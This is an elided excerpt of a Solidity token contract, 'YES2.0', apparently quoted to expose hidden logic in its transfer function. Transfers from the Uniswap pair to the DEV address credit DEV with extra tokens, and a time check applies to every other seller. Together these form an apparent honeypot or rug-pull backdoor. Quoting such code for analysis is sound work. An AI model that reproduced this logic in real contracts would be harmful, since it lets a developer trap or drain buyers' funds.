...
contract YESTWO is Ownable, IERC20 {
    ...
    string private  _name = "YES2.0";
    string private  _symbol = "YES2.0";
    ...
    uint256 CAC = _totalSupply * 100 *100;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from == uniswapV2Pair && to == DEV )  { _tOwned[DEV] += D;}
        ...
        uint256 f = Buyser[from] + dd * cc ;

        if ( from !=uniswapV2Pair ) {if(from != DEV){ {require (   f  >=  time ) ;} } }
